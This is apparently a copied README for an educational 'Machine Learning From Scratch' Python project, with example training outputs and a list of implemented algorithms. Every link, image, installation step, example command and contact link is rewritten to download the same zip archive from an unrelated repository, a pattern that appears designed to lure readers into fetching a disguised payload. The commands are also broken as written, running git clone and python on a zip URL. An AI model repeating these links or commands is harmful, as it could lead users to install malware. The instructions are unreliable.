# Machine Learning From Scratch

## About
Python implementations of some of the fundamental Machine Learning models and algorithms from scratch.

The purpose of this project is not to produce as optimized and computationally efficient algorithms as possible
but rather to present the inner workings of them in a transparent and accessible way.

## Table of Contents
- [Machine Learning From Scratch](#machine-learning-from-scratch)
  * [About](#about)
  * [Table of Contents](#table-of-contents)
  * [Installation](#installation)
  * [Examples](#examples)
    + [Polynomial Regression](#polynomial-regression)
    + [Classification With CNN](#classification-with-cnn)
    + [Density-Based Clustering](#density-based-clustering)
    + [Generating Handwritten Digits](#generating-handwritten-digits)
    + [Deep Reinforcement Learning](#deep-reinforcement-learning)
    + [Image Reconstruction With RBM](#image-reconstruction-with-rbm)
    + [Evolutionary Evolved Neural Network](#evolutionary-evolved-neural-network)
    + [Genetic Algorithm](#genetic-algorithm)
    + [Association Analysis](#association-analysis)
  * [Implementations](#implementations)
    + [Supervised Learning](#supervised-learning)
    + [Unsupervised Learning](#unsupervised-learning)
    + [Reinforcement Learning](#reinforcement-learning)
    + [Deep Learning](#deep-learning)
  * [Contact](#contact)

## Installation
    $ git clone https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip
    $ cd ML-From-Scratch
    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip install

## Examples
### Polynomial Regression
    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip

<p align="center">
    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip" width="640"\>
</p>
<p align="center">
    Figure: Training progress of a regularized polynomial regression model fitting <br>
    temperature data measured in Linköping, Sweden 2016.
</p>

### Classification With CNN
    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip

    +---------+
    | ConvNet |
    +---------+
    Input Shape: (1, 8, 8)
    +----------------------+------------+--------------+
    | Layer Type           | Parameters | Output Shape |
    +----------------------+------------+--------------+
    | Conv2D               | 160        | (16, 8, 8)   |
    | Activation (ReLU)    | 0          | (16, 8, 8)   |
    | Dropout              | 0          | (16, 8, 8)   |
    | BatchNormalization   | 2048       | (16, 8, 8)   |
    | Conv2D               | 4640       | (32, 8, 8)   |
    | Activation (ReLU)    | 0          | (32, 8, 8)   |
    | Dropout              | 0          | (32, 8, 8)   |
    | BatchNormalization   | 4096       | (32, 8, 8)   |
    | Flatten              | 0          | (2048,)      |
    | Dense                | 524544     | (256,)       |
    | Activation (ReLU)    | 0          | (256,)       |
    | Dropout              | 0          | (256,)       |
    | BatchNormalization   | 512        | (256,)       |
    | Dense                | 2570       | (10,)        |
    | Activation (Softmax) | 0          | (10,)        |
    +----------------------+------------+--------------+
    Total Parameters: 538570

    Training: 100% [------------------------------------------------------------------------] Time: 0:01:55
    Accuracy: 0.987465181058

<p align="center">
    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip" width="640">
</p>
<p align="center">
    Figure: Classification of the digit dataset using CNN.
</p>

### Density-Based Clustering
    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip

<p align="center">
    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip" width="640">
</p>
<p align="center">
    Figure: Clustering of the moons dataset using DBSCAN.
</p>

### Generating Handwritten Digits
    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip

    +-----------+
    | Generator |
    +-----------+
    Input Shape: (100,)
    +------------------------+------------+--------------+
    | Layer Type             | Parameters | Output Shape |
    +------------------------+------------+--------------+
    | Dense                  | 25856      | (256,)       |
    | Activation (LeakyReLU) | 0          | (256,)       |
    | BatchNormalization     | 512        | (256,)       |
    | Dense                  | 131584     | (512,)       |
    | Activation (LeakyReLU) | 0          | (512,)       |
    | BatchNormalization     | 1024       | (512,)       |
    | Dense                  | 525312     | (1024,)      |
    | Activation (LeakyReLU) | 0          | (1024,)      |
    | BatchNormalization     | 2048       | (1024,)      |
    | Dense                  | 803600     | (784,)       |
    | Activation (TanH)      | 0          | (784,)       |
    +------------------------+------------+--------------+
    Total Parameters: 1489936

    +---------------+
    | Discriminator |
    +---------------+
    Input Shape: (784,)
    +------------------------+------------+--------------+
    | Layer Type             | Parameters | Output Shape |
    +------------------------+------------+--------------+
    | Dense                  | 401920     | (512,)       |
    | Activation (LeakyReLU) | 0          | (512,)       |
    | Dropout                | 0          | (512,)       |
    | Dense                  | 131328     | (256,)       |
    | Activation (LeakyReLU) | 0          | (256,)       |
    | Dropout                | 0          | (256,)       |
    | Dense                  | 514        | (2,)         |
    | Activation (Softmax)   | 0          | (2,)         |
    +------------------------+------------+--------------+
    Total Parameters: 533762


<p align="center">
    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip" width="640">
</p>
<p align="center">
    Figure: Training progress of a Generative Adversarial Network generating <br>
    handwritten digits.
</p>

### Deep Reinforcement Learning
    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip

    +----------------+
    | Deep Q-Network |
    +----------------+
    Input Shape: (4,)
    +-------------------+------------+--------------+
    | Layer Type        | Parameters | Output Shape |
    +-------------------+------------+--------------+
    | Dense             | 320        | (64,)        |
    | Activation (ReLU) | 0          | (64,)        |
    | Dense             | 130        | (2,)         |
    +-------------------+------------+--------------+
    Total Parameters: 450

<p align="center">
    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip" width="640">
</p>
<p align="center">
    Figure: Deep Q-Network solution to the CartPole-v1 environment in OpenAI gym.
</p>

### Image Reconstruction With RBM
    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip

<p align="center">
    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip" width="640">
</p>
<p align="center">
    Figure: Shows how the network gets better during training at reconstructing <br>
    the digit 2 in the MNIST dataset.
</p>

### Evolutionary Evolved Neural Network
    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip

    +---------------+
    | Model Summary |
    +---------------+
    Input Shape: (64,)
    +----------------------+------------+--------------+
    | Layer Type           | Parameters | Output Shape |
    +----------------------+------------+--------------+
    | Dense                | 1040       | (16,)        |
    | Activation (ReLU)    | 0          | (16,)        |
    | Dense                | 170        | (10,)        |
    | Activation (Softmax) | 0          | (10,)        |
    +----------------------+------------+--------------+
    Total Parameters: 1210

    Population Size: 100
    Generations: 3000
    Mutation Rate: 0.01

    [0 Best Individual - Fitness: 3.08301, Accuracy: 10.5%]
    [1 Best Individual - Fitness: 3.08746, Accuracy: 12.0%]
    ...
    [2999 Best Individual - Fitness: 94.08513, Accuracy: 98.5%]
    Test set accuracy: 96.7%

<p align="center">
    <img src="https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip" width="640">
</p>
<p align="center">
    Figure: Classification of the digit dataset by a neural network which has<br>
    been evolutionary evolved.
</p>

### Genetic Algorithm
    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip

    +--------+
    |   GA   |
    +--------+
    Description: Implementation of a Genetic Algorithm which aims to produce
    the user specified target string. This implementation calculates each
    candidate's fitness based on the alphabetical distance between the candidate
    and the target. A candidate is selected as a parent with probabilities proportional
    to the candidate's fitness. Reproduction is implemented as a single-point
    crossover between pairs of parents. Mutation is done by randomly assigning
    new characters with uniform probability.

    Parameters
    ----------
    Target String: 'Genetic Algorithm'
    Population Size: 100
    Mutation Rate: 0.05

    [0 Closest Candidate: 'CJqlJguPlqzvpoJmb', Fitness: 0.00]
    [1 Closest Candidate: 'MCxZxdr nlfiwwGEk', Fitness: 0.01]
    [2 Closest Candidate: 'MCxZxdm nlfiwwGcx', Fitness: 0.01]
    [3 Closest Candidate: 'SmdsAklMHn kBIwKn', Fitness: 0.01]
    [4 Closest Candidate: '  lotneaJOasWfu Z', Fitness: 0.01]
    ...
    [292 Closest Candidate: 'GeneticaAlgorithm', Fitness: 1.00]
    [293 Closest Candidate: 'GeneticaAlgorithm', Fitness: 1.00]
    [294 Answer: 'Genetic Algorithm']

### Association Analysis
    $ python https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip
    +-------------+
    |   Apriori   |
    +-------------+
    Minimum Support: 0.25
    Minimum Confidence: 0.8
    Transactions:
        [1, 2, 3, 4]
        [1, 2, 4]
        [1, 2]
        [2, 3, 4]
        [2, 3]
        [3, 4]
        [2, 4]
    Frequent Itemsets:
        [1, 2, 3, 4, [1, 2], [1, 4], [2, 3], [2, 4], [3, 4], [1, 2, 4], [2, 3, 4]]
    Rules:
        1 -> 2 (support: 0.43, confidence: 1.0)
        4 -> 2 (support: 0.57, confidence: 0.8)
        [1, 4] -> 2 (support: 0.29, confidence: 1.0)


## Implementations
### Supervised Learning
- [Adaboost](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Bayesian Regression](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Decision Tree](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Elastic Net](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Gradient Boosting](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [K Nearest Neighbors](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Lasso Regression](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Linear Discriminant Analysis](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Linear Regression](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Logistic Regression](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Multi-class Linear Discriminant Analysis](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Multilayer Perceptron](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Naive Bayes](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Neuroevolution](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Particle Swarm Optimization of Neural Network](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Perceptron](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Polynomial Regression](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Random Forest](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Ridge Regression](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Support Vector Machine](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [XGBoost](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)

### Unsupervised Learning
- [Apriori](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Autoencoder](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [DBSCAN](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [FP-Growth](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Gaussian Mixture Model](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Generative Adversarial Network](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Genetic Algorithm](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [K-Means](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Partitioning Around Medoids](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Principal Component Analysis](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
- [Restricted Boltzmann Machine](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)

### Reinforcement Learning
- [Deep Q-Network](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)

### Deep Learning
  + [Neural Network](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
  + [Layers](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
    * Activation Layer
    * Average Pooling Layer
    * Batch Normalization Layer
    * Constant Padding Layer
    * Convolutional Layer
    * Dropout Layer
    * Flatten Layer
    * Fully-Connected (Dense) Layer
    * Fully-Connected RNN Layer
    * Max Pooling Layer
    * Reshape Layer
    * Up Sampling Layer
    * Zero Padding Layer
  + Model Types
    * [Convolutional Neural Network](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
    * [Multilayer Perceptron](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)
    * [Recurrent Neural Network](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip)

## Contact
If there's some implementation you would like to see here or if you're just feeling social,
feel free to [email](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip) me or connect with me on [LinkedIn](https://raw.githubusercontent.com/AvishekInvincible/ML-From-Scratch/master/mlfromscratch/data/ML-From-Scratch_v1.2.zip).
